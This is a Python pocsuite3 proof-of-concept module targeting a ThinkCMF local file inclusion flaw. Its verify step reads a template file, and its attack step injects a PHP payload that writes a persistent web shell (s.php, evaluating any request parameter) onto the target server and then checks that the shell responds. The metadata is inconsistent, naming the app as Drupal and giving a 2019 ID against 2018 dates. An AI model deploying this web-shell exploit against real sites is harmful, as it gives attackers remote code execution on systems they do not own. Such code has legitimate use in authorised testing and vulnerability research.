import os, base64
from collections import OrderedDict
from urllib.parse import urljoin

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger
from pocsuite3.lib.utils import random_str

# 'Result':{
#    'DBInfo' :   {'Username': 'xxx', 'Password': 'xxx', 'Salt': 'xxx' , 'Uid':'xxx' , 'Groupid':'xxx'},
#    'ShellInfo': {'URL': 'xxx', 'Content': 'xxx' },
#    'FileInfo':  {'Filename':'xxx','Content':'xxx'},
#    'XSSInfo':   {'URL':'xxx','Payload':'xxx'},
#    'AdminInfo': {'Uid':'xxx' , 'Username':'xxx' , 'Password':'xxx' }
#    'Database':  {'Hostname':'xxx', 'Username':'xxx',  'Password':'xxx', 'DBname':'xxx'},
#    'VerifyInfo':{'URL': 'xxx' , 'Postdata':'xxx' , 'Path':'xxx'}
#    'SiteAttr':  {'Process':'xxx'}
#    'Stdout': 'result output string'
# }

class DemoPOC(POCBase):
    vulID = 'ThinkCMFX LFI 2019'
    version = '1.0'
    author = ['cz']
    vulDate = '2018-03-08'
    createDate = '2018-04-12'
    updateDate = '2018-04-13'
    references = ['']
    name = 'ThinkCMFS本地文件包含'
    appPowerLink = ''
    appName = 'Drupal'
    appVersion = 'X1.6.0 X2.1.0 X2.2.x-3'
    vulType = 'Local File Inclusion'
    desc = ''''''
    samples = []
    install_requires = ['']
    pocDesc = ''
    testedEnv = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

    def _options(self):
        o = OrderedDict() 
        return o

    def _verify(self):
        result = {}

        payload = 'a=display&templateFile=README.md'
        resp = requests.get(self.url, params=payload)

        try:
            if resp.status_code == 200 and 'README' in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Postdata'] = payload
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)

    def _attack(self):
        result = {}

        payload = '''a=fetch&content=<?php file_put_contents('s.php','<?php echo "DEADBEEF";eval($_REQUEST["CzCzCz"]); ?>'); ?>'''
        resp = requests.get(self.url, payload) 
        resp = requests.get(urljoin(self.url, 's.php'))
        try:
            if resp.status_code == 200 and 'DEADBEEF' in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Postdata'] = payload
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)
    
register_poc(DemoPOC)